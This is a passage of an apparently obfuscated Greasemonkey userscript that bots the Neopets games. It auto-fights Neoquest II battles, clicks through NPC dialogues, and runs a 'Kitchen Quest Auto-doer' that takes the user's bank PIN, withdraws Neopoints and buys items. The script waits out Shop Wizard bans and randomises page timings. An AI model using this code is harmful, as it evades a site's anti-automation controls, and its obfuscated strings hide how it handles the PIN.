							GM_setValue("isHasted", true);
						}
					}
					if ((texts[j + 1].color == "#d0d000") || (texts[j + 1].color == "red")) {
						fact = 5;
						useid = GM_getValue("healingitem");
						var fleepss = false;
					}
					break;
				case "<b>Talinia</b>":
					if (GM_getValue("damage") == false) {
						fact = 5;
						useid = GM_getValue("damageid");
					}
					if (document.evaluate("//a[contains(@onclick, 'setaction(9302)')]", document, null, 9, null).singleNodeValue) {
						fact = 9302;
					}
					nxactor = 3;
					if ((texts[j + 1].color == "#d0d000") || (texts[j + 1].color == "red")) {
						fact = 5;
						useid = GM_getValue("healingitem");
						var fleepss = false;
					}
					break;
				case "<b>Velm</b>":
					var l = 0;
					var fullhp = 0;
					var allies = false;
					var fleepss = false;
					if (document.evaluate("//img[contains(@src, '/nq2/x/donothing.gif')]", document, null, 9, null).singleNodeValue) {
						allies = true;
					}
					//if checking allies HP
					if (allies) {
						if (document.evaluate("//img[contains(@src, '/nq2/x/exp_green.gif')]", document, null, 9, null).singleNodeValue) {
							if (document.evaluate("//img[contains(@src, '/nq2/x/exp_green.gif')]", document, null, 9, null).singleNodeValue.width == 45) //45 is full health
							{
								fullhp++;
							}
						}
					}
					nxactor = 4;
					fact = GM_getValue("velmact");
					if (fullhp == 4) {
						if (GM_getValue("Velmhast")) {
							fact = 3;
						}
						else {
							fact = GM_getValue("VelmAction", 9403);
							GM_setValue("Velmhast", true);
						}
					}
					if ((texts[j + 1].color == "#d0d000") || (texts[j + 1].color == "red")) {
						fact = 5;
						useid = GM_getValue("healingitem");
						var fleepss = false;
					}
					break;
				}
			}
			if (fact == "5") {
				if (!document.evaluate("id('content')//td/table/tbody/tr/td/a[@onclick='setaction(5); setitem(" + GM_getValue('healingitem') + "); document.ff.submit(); return false;;']", document, null, 9, null).singleNodeValue) {
					selectitem();
					if (!document.evaluate("id('content')//td/table/tbody/tr/td/a[@onclick='setaction(5); setitem(" + GM_getValue('healingitem') + "); document.ff.submit(); return false;;']", document, null, 9, null).singleNodeValue) {
						selectitem();
						if (!document.evaluate("id('content')//td/table/tbody/tr/td/a[@onclick='setaction(5); setitem(" + GM_getValue('healingitem') + "); document.ff.submit(); return false;;']", document, null, 9, null).singleNodeValue) {
							selectitem();
						}
					}
				}
			}


			function attack() {
				var timeout = setTimeout(function() {
					document.getElementsByName("target")[0].value = GM_getValue("hitTarget", 5);
					document.getElementsByName("fact")[0].value = fact;
					document.getElementsByName("use_id")[0].value = useid;
					document.getElementsByName("nxactor")[0].value = nxactor;
					location.href = "javascript: document.ff.submit();"
				},
				REFRESHS);
			}
			if (GM_getValue("flee") == true) // if flee off than will attack
			{
				attack();
			}
			if (GM_getValue("flee") == false) // if flee is on
			{
				if (fleepss) {
					var timeout = setTimeout(function() {
						location.href = "javascript:setaction(4); document.ff.submit()";
					},
					REFRESHS);
				}
				else {
					attack();
				}
			}

		}
	}

	//AUTO TALKS
	switch (location.href) {
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=10408':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=10408&say=do';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=10408&say=do':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=10408&say=join';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=10701':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=10701&say=rest';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=10708':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=10708&say=city';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=10708&say=city':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=10708&say=how';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=10718':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=10718&say=city';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=10718&say=city':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=10718&say=yes';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=10718&say=yes':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=10718&say=about';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=10718&say=about':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=10718&say=east';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=10718&say=east':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=10718&say=enter';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=10801':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=10801&say=key';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=11201':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=11201&say=town';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=11201&say=town':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=11201&say=troubles';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=11205':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=11205&say=troubles';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=11205&say=troubles':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=11205&say=yes';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=11205&say=yes':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=11205&say=sympathize';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=11204':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=11204&say=rest';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=11001':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=11001&say=rest';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=20510':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=20510&say=join';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=20701':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=20701&say=top';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=20701&say=top':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=20701&say=rest';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=30504':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=30504&say=who';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=30504&say=who':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=30504&say=join';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=30504&say=join':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=skills&show_char=4';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=30510&say=calm':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=30510&say=home';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=30510&say=curious':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=30510&say=purpose';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=30510&say=purpose':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=30510&say=find';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=30510&say=find':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=30510&say=fates';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=30101':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=30101&say=code';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=30101&say=code':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=30101&say=medallion';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=40301':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=40301&say=town';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=40301&say=town':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=40301&say=impossible';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=40301&say=impossible':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=40301&say=find';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=40401':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=40401&say=we';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=40401&say=we':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=40401&say=vonroo';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=40401&say=vonroo':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=40401&say=sun';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=40401&say=sun':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=40401&say=ghosts';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=40101':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=40101&say=okay';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=40101&say=okay':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=40101&say=hate';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=40501':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=40501&say=adventurers';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=40501&say=adventurers':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=40501&say=yes';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=40501&say=yes':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=40501&say=how';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=40501&say=how':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=40501&say=anything';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=50701':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=50701&say=rest';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=50501&say=who':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=50501&say=what';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=50501&say=what':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=50501&say=faerie';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=50602':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=50602&say=who';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=50602&say=who':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=50602&say=you';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=50605&say=problem':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=50605&say=key';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=50605&say=key':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=50605&say=terask';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=50605&say=terask':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=50605&say=what';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=50605&say=what':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=50605&say=where';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=50605&say=where':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=50605&say=catch';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=50605&say=catch':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=50605&say=devils';
		},
		REFRESHS);
		break;
	case 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=10201':
		setTimeout(function() {
			location.href = 'http://www.neopets.com/games/nq2/nq2.phtml?act=talk&targ=10201&say=rest';
		},
		REFRESHS);
		break;
	}

	(function() {
		if (document.documentURI.substr(0, 14) == "about:neterror") {
			location.href = "http://www.neopets.com/games/nq2/nq2.phtml";
		}
	})();
}
/** Memory release **/
window.addEventListener("unload", function() {
	flee = null;
	useid = null;
	fact = null;
	nxactor = null;
	imagehelp = null;
	pass = null;
	REFRESHS = null;
	scriptonoff = null;
	img = null;
	url = null;
	pathIndex = null;
	walk = null;
	open = null;
	haste = null;
	useid = null;
	walk = null;
	nxactor = null;
	fact = null;
	hitTarget = null;
	doMultipleTargets = null;
	texts = null;
	item2 = null;
},
false);

var VARIABLE_0 = ["statsDated", " ", "split", "datum", "div", "createElement", "innerHTML", "Show/Hide Stats", "style", "position: absolute; right: 5px; top: 21px; font-family: tahoma; font-size: 10pt; font-weight: 600; -moz-user-select: none; -khtml-user-select: none; cursor: pointer;", "setAttribute", "click", "addEventListener", "main", "getElementById", "substr", "/", "href", "browseshop.phtml?", "appendChild", "body", "neomessages.phtml", "noticeboard.phtml", "shop.phtml", "position: absolute; right: 5px; top: 82px; width: 250px; height: 325px; background-color: #FFFFFF; font-family: tahoma; font-size: 10pt; text-align: center; padding: 0px; border: solid 1px; z-index: 110;", "<b><u>STATS SUMMARY</u> </b>since<b> ", "please reset", "<br><br><u>Gained pet stats:</u><br></b>", "<b>Level: ", "level", "<br>Hit Points: ", "hitpoints", "<br>Strength: ", "strength", "<br>Defence: ", "defence", "<br>Movement: ", "agility", "<br><br><u>Totals:</u><br>Quests completed: ", "numberQdone", "<br>Total NP spent: ", "NPspent", " NP<br>Average spent per quest: ", "averageSpent", " NP<br><br><u>Percentages:</u><br>Item received: ", "gotitem", " (", "round", "%)<br>NP received: ", "gotmoney", "%)<br>Pet upgrade received: ", "gotstat", "%)<br><br></b>", "visibility", "statsvisi", "hidden", "<font color=#E42217>Click here to reset stats</font>", "position: relative; font-family: tahoma; font-size: 10pt; font-weight: 600; -moz-user-select: none; -khtml-user-select: none; cursor: pointer;", "Show/Hide program", "position: absolute; right: 5px; top: 61px; font-family: tahoma; font-size: 10pt; font-weight: 600; -moz-user-select: none; -khtml-user-select: none; cursor: pointer;", "buttontext", "START QUEST", "<font color=#FF0000><b>SCRIPT INACTIVE</b></font>", "STOP QUEST", "<font color=#4AA02C><b>SCRIPT ACTIVE</b></font>", "position: absolute; right: 5px; top: 82px; font-family: tahoma; font-size: 10pt; font-weight: 600; -moz-user-select: none; -khtml-user-select: none; cursor: pointer;", "position: absolute; right: 5px; top: 82px; width: auto; height: auto; background-color: #FFFFFF; font-family: tahoma; font-size: 10pt; text-align: center; padding: 0px; border: solid 1px; z-index: 100;", "visi", "visible", "position: relative; width: auto; height: auto; background-color: #3BB9FF; font-family: Comic Sans MS; font-size: 18pt; text-align: center; padding: 5px; border-bottom: solid 1px; z-index: 100;", "<font color=#000000>Kitchen Quest Auto-doer</font>", "Log", "Nothing in logfile", "position: relative; overflow: scroll; right: 0px; top: 0px; width: 400px; height: 300px; background: transparent; font-family: tahoma; font-size: 10pt; text-align: left; padding: 5px; border: none; z-index: 103;", "scrollTop", "scrollHeight", "position: absolute; right: 17px; top: 45px; width: 393px; height: 295px; background-color: #FFFFFF; z-index: 101;", "<img src='http://images.neopets.com/games/tradingcards/2.gif' width='395' height='297' style='opacity:0.4;' />", "position: absolute; right: 15px; top : 44px; z-index: 102", "Clear Logfile", "position: absolute; right: 5px; top: 43px; font-family: tahoma; font-size: 10pt; font-weight: 600; -moz-user-select: none; -khtml-user-select: none; cursor: pointer;", "position: relative; right: 0px; top: 0px; width: 400px; height: auto; background-color: #989898; font-family: tahoma; font-size: 10pt; text-align: center; white-space:pre; padding: 5px; border-top: solid 1px; border-bottom: solid 1px; z-index: 100;", "PIN#: <input type='text' style='border: none; text-align: center; background-color: #EEEEEE;' value='", "PIN", "' id='PIN' size='4'> (if you have one)", "position: relative; ", "Max number of refreshes per item in SW: <input type='text' style='border: none; text-align: center; background-color: #EEEEEE;' value='", "number_refresh", "6", "' id='number_refresh' size='2'>", "Don't spend more than <input type='text' style='border: none; text-align: center; background-color: #EEEEEE;' value='", "max_total_price", "5000", "' id='max_total_price' size='5'> NP on a quest.", "<input type='checkbox' id='SDB' value='checked' ", "SDB", "unchecked", "> Check SDB at quest start <i>(removes required items if present)</i>", "position: relative; text-align: left;", "<input type='checkbox' id='QS' value='checked' ", "QS", "> Prevent full inventory, max 44 items <i>(SDB storage, logged)</i>", "<input type='checkbox' id='DoBank' value='checked' ", "DoBank", "> Withdraw ", "<input type='text' id='ATMvalue' value='", "ATMvalue", "' style='border: none; text-align: center; background-color: #EEEEEE;' size='4'> NP from the bank if you run out of NP.", "<input type='checkbox' id='repeatQ' value='checked' ", "repeatQ", "> Auto-do ALL quests <i>(unchecked = single quest)</i>", "<input type='checkbox' id='TimeOutSW' value='checked' ", "TimeOutSW", "> Wait for SW ban to lift and auto-resume", "<input type='checkbox' id='TimeOutEdna' value='checked' ", "TimeOutEdna", "> If too expensive, wait for quest to expire and auto-start new quest", "<input type='checkbox' id='AlertMe' value='checked' ", "AlertMe", "> I'll be present when idling (quest/ban time ) is over so alert me!", "<input type='checkbox' id='frozen' value='checked' ", "frozen", "> Use random time between <input type='text' id='bottomTime' value='", "bottomTime", "1", "' style='border: none; text-align: center; background-color: #EEEEEE;' size='1'> and <input type='text' id='topTime' value='", "topTime", "2", "' style='border: none; text-align: center; background-color: #EEEEEE;' size='1'> seconds for the page<br>      transitions <i>(unchecked = 1.5 sec constant)</i>", "position: relative; right: 0px; top: 0px; width: auto; height: auto; background-color: #D80000; font-family: tahoma; font-size: 10pt; text-align: center; padding: 5px; border: none; z-index: 100;", "<input type='button' id='startQuestButton' value='", "'>", "position: relative; text-align: center", "<input type='button' id='continueQuestButton' value='DO QUEST ANYWAY'>", "ContBut", "location", "http://www.neopets.com/market.phtml?type=wizard", "Faerie Quest</b></a> and are not allowed to use the Shop Wizard! :)", "indexOf", "<b>You are on a faerie quest and cannot use the shop wizard! Terminating...</b><br>", "startQuestButton", "IdleAbsent", "nst", ":", "hourWait", "EdnaWait", "Idle", "end_hour", "end_min", "QwasIDLE", "Started", "DoSWBan", "LiftBan", "banned", "hours", "please come back<br>in about <b>", "pm", "am", "<b><font color=#E42217>Option checked: </font>It is now [", "],you have a ban from the Shop Wizard.<br>Script will idle and restart the same quest in <font color=#E42217>", " min(s)</font> or at approximately [", ":01:00 ", " NST]</b>", "<b>You have a ban from the Shop Wizard. Terminating...</b><br>", "http://images.neopets.com/homepage/indexbak_oops.png", "<b>Neopets seems to be down! Terminating...</b><br>", "document.location = 'http://www.neopets.com/island/kitchen.phtml'", "http://www.neopets.com/quickstock.phtml", "DoQS", "//form[@name = \"quickstock\"]//tr/td[@align = \"left\"]", "evaluate", "//form[@name=\"quickstock\"]//input[@value=\"deposit\"]", "QSnumber", "Moving <b>", "snapshotItem", "</b> to SDB...", "//input[@type = \"submit\" and @value = \"Submit\"]", "http://www.neopets.com/quickstock.phtml?r=", "document.location = 'http://www.neopets.com/objects.phtml?type=inventory'", "Sorry, you can only carry a maximum of <b>50</b> items at one time!", "<b>Inventory is FULL, make some space and restart please! Terminating...</b><br>", "http://www.neopets.com/bank.phtml", "goToBank", "doneBank", "", "replace", "//div//tr/td[2]/table//tr[2]/td[2]", "<b>Add a PIN</b></a> for use in this area!", "value", "//input[@type = \"password\" and @name = \"pin\"]", "//input[@type = \"text\" and @name = \"amount\"]", "<b>Withdrawing ", " NP</b>!</b>", "getURL", "InShop", "tryBuy", "//input[@type = \"submit\" and @value = \"Withdraw\"]", "confirm", "<b>You don't have enough on your bank account, terminating...</b><br>", "document.location = '", "shopURL", "'", "You do not have enough Neopoints to purchase this item!", "checked", "<b><font color=#E42217>Option checked: </font>Out of neopoints! Going to the bank...</b>", "document.location = 'http://www.neopets.com/bank.phtml'", "<b>Out of neopoints! Terminating...</b><br>", "http://www.neopets.com/island/kitchen.phtml", "They will just have to go without their food", "Previous quest has timed out.<br>", "<b>Daily Quest Limit Reached</b>", "<b>No more quests left for today! Terminating...</b><br>", "<b>Nobody seems to be at home...</b>", "<b>Unable to start/finish quest, Underwater Chef is not there!<br>Try again later...</b>", "<b>[", "] <font color=#E42217>Option checked: </font></b>Underwater Chef is <b>NOT</b> present, script will idle and auto-start a new quest in <font color=#E42217><b>", " min(s)</b></font> or at approximately <b>[", "Ever since the Royal Family of Maraqua", "OneDone", "<b><font color=#3BB9FF size='3'>Starting new kitchen quest!</font></b><br>", "item1", "item2", "item3", "item4", "numberValidInv", "TotalItems", "itemname1", "itemname2", "itemname3", "itemname4", "itemnameSDB1", "itemnameSDB2", "itemnameSDB3", "itemnameSDB4", "itemnameINV1", "itemnameINV2", "itemnameINV3", "itemnameINV4", "//form[contains(@action,\"kitchen2.phtml\")]/input[@type = \"submit\" and @value = \"Sure, I will help!\"]", "I have the Ingredients", "readyFinish", "//form[contains(@action,\"kitchen2.phtml\")]//tr[3]/td[contains(@bgcolor, \"#ffffee\")]/b", "snapshotLength", "push", "length", "Underwater Chef requires <b>", "</b> items from you:", "itemname", "- ", "join", "itemsNeeded", "number_itemsNeeded", "<b><b>", "</b> hr(s)", "hr(s) and <b>", "</b> min(s) left", "<b><font color=#E42217>Option checked: </font></b>Checking SDB for possible stored items.", "document.location = 'http://www.neopets.com/safetydeposit.phtml'", "Giving all collected items to Underwater Chef for his brew.", "//input[@type = \"submit\" and @value = \"I have the Ingredients!\"]", "http://www.neopets.com/island/kitchen2.phtml", "//td[contains(@align, \"center\")]/b", "I have successfully made", "spentONquest", "You have been given", "You have been given <b>", "</b> Neopoints as a reward!", "] Quest completed! You are awarded <font color=#E42217>", " NP</font>!!!</b>", "You get a ", "You get a <b>", "</b>!!!", "] Quest completed! You are awarded an item: <font color=#E42217>", "</font>!!!</b>", "has gained a level!!!", "] Quest completed! <font color=#E42217>Your pet has gained a level</font>!!!</b>", "has gained a hit point!!!", "] Quest completed! <font color=#E42217>Your pet has gained a hit point</font>!!!</b>", "has become better at Defence!!!", "] Quest completed! <font color=#E42217>Your pet has become better at Defence</font>!!!</b>", "has become better at Agility!!!", "] Quest completed! <font color=#E42217>Your pet has become better at Agility</font>!!!</b>", "has become better at Attack!!!", "] Quest completed! <font color=#E42217>Your pet has become better at Attack</font>!!!</b>", "Single quest complete, shutting down...<br>", "<b><font color=#E42217>Option checked: </font></b>Quest complete, starting next one...<br>", "http://www.neopets.com/process_safetydeposit.phtml?checksub=scan", "http://www.neopets.com/process_bank.phtml", "<font color=#E42217><b>WRONG PIN!!! SET CORRECT PIN PLEASE! TERMINATING...</b></font><br>", "http://www.neopets.com/objects.phtml?type=inventory", "doneBuying", "Final inventory check:", "itemnameINV", "//td[contains(@class, \"contentModuleContent\")]/table/tbody//tr//td[text()= \"", "\"]", "\"]//b", "\"]//b[text() = '(trading)']", "\"]//b[text() = '(auctioned)']", "Found <b>", " </b> in inventory.", "0", "All items present in inventory, going back to Underwater Chef.", "You currently hold <b>", "</b> items", "<b><font color=#E42217>Option checked: </font>Inventory contains ", " items, max allowed is 44. Moving ", " items to SDB.</b>", "document.location = 'http://www.neopets.com/quickstock.phtml'", "Checking inventory for possible present items.", "itemnameSDB", "klaarSDB", "<br>Starting with gathering lowest prices.", "document.location = 'http://www.neopets.com/market.phtml?type=wizard'", "itemfilled", "http://www.neopets.com/market.phtml", "//span[@style=\"font-size: 14pt;\"]", "textContent", "...", "<br><form action=\"market.phtml\" method=\"post\"><input type=\"hidden\" name=\"type\" value=\"process_wizard\"><input type=\"hidden\" name=\"feedset\" value=\"0\"><input type=\"hidden\" name=\"shopwizard\" value=\"", "toLowerCase", "\"><input type=\"hidden\" name=\"table\" value=\"shop\"><input type=\"hidden\" name=\"criteria\" value=\"exact\"><input type=\"hidden\" name=\"min_price\" value=\"0\"><input type=\"hidden\" name=\"max_price\" value=\"99999\"><input type=\"submit\" value=\"", "\"></form><br>", "nextSibling", "lastChild", "parentNode", "insertBefore", "refreshed", "submit", "form", "getElementsByTagName", "item", "Could not find any buyable <b>", "current_item", "</b>, terminating quest.<br>", "results_array", "TotalPrice", "temp", "Total price (<b>", " NP</b>) is higher than maximum allowed by you(<b>", " NP</b>)<br>Click <b>'DO QUEST ANYWAY'</b> if you still wish to complete it.", "<b><font color=#E42217>Option checked: </font></b>Or just let this script idle until the quest times out.<br><b>It is now [", "] A new quest will be started automatically in <font color=#E42217>", " hr(s) and ", ":0", ":00 ", "<br>Total price for items is <b>", " NP.</b> which is OK! Purchase of items started!", "//table[not(contains(@cellpadding, \"3\"))]/tbody/tr/td/a[contains(@href, \"buy_item\")]", "Item not found!", "There are no items for sale in this shop!", "getNewURL", "Item was sold in meanwhile, buying second to cheapest", "numberstocked", "<b>", "itemnamebuy", "</b><br>", " in stock<br>", "numberstocked2", "</b> was bought successfully for <b>", "tempPrice", " NP</b>!", "itembuying", "|", "splice", "cost_neopoints=", "You have bought all items needed!", "safetydeposit.phtml", "searching", "obj_name", "getElementsByName", "//input[@type = \"submit\" and @value = \"Find\"]", "Not finding any items with that criteria!", "<br>", "//form//td[contains(@align, \"left\")]/b/.[text() = \"", "firstChild", "</b> in SDB, moving to inventory...", "//input[@type = \"submit\" and @value = \"Move Selected Items\"]", "buy_cost_neopoints=100000", "What are you looking for?", "http://images.neopets.com/shopkeepers/shopwizard.gif", "shopwizard", "min_price", "max_price", "selectedIndex", "select", "table", "Gathering prices for <b>", "</b>", "//div/input[@type = \"submit\" and @value = \"Search\"]", "match", "continueQuestButton", "//a[contains(@href, \"browseshop\")]", "substring", "<br>Purchase of items started.", "<br />", "<b>Shop Wizard ban is over, restarting last quest...<br></b>", "Shop Wizard ban is over, click ok to continue!", "Quest has timed out, next quest will be started, click ok!", "Underwater Chef has returned by now, starting quest. Click ok!", "3", "random", "floor"];
if (GM_getValue("statsDated", 0) == 0) {
	datum = new Date().toString();
	month = datum.split(" ")[1];
	day = datum.split(" ")[2];
	year = datum.split(" ")[3];
	GM_setValue("statsDated", 1);
